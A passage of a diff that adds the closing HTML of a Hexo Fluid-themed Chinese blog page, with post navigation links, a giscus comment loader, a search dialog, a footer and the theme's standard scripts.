+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/07/12/Learn/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="Go语言学习">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Go语言学习</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/05/06/Learn/%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B9%8BPHP%E5%86%85%E5%AD%98%E9%A9%AC/" title="内存马学习之php内存马">
+                        <span class="hidden-mobile">内存马学习之php内存马</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+    <div id="giscus" class="giscus"></div>
+    <script type="text/javascript">
+      Fluid.utils.loadComments('#giscus', function() {
+        var options = {"repo":"genIoco/genIoco.github.io","repo-id":"R_kgDOMU-44w","category":"General","category-id":"DIC_kwDOMU-4484CgxC5","theme-light":"light","theme-dark":"dark","mapping":"og:title","reactions-enabled":1,"emit-metadata":0,"input-position":"top","lang":"zh-CN"};
+        var attributes = {};
+        for (let option in options) {
+          if (!option.startsWith('theme-')) {
+            var key = option.startsWith('data-') ? option : 'data-' + option;
+            attributes[key] = options[option];
+          }
+        }
+        var light = 'light';
+        var dark = 'dark';
+        window.GiscusThemeLight = light;
+        window.GiscusThemeDark = dark;
+        attributes['data-theme'] = document.documentElement.getAttribute('data-user-color-scheme') === 'dark' ? dark : light;
+        for (let attribute in attributes) {
+          var value = attributes[attribute];
+          if (value === undefined || value === null || value === '') {
+            delete attributes[attribute];
+          }
+        }
+        var s = document.createElement('script');
+        s.setAttribute('src', 'https://giscus.app/client.js');
+        s.setAttribute('crossorigin', 'anonymous');
+        for (let attribute in attributes) {
+          s.setAttribute(attribute, attributes[attribute]);
+        }
+        var ss = document.getElementsByTagName('script');
+        var e = ss.length > 0 ? ss[ss.length - 1] : document.head || document.documentElement;
+        e.parentNode.insertBefore(s, e.nextSibling);
+      });
+    </script>
+    <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/js/DynamicRibbon.js"></script>
+<script src="/js/leaves.js"></script>
+<script src="/js/containsWord.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
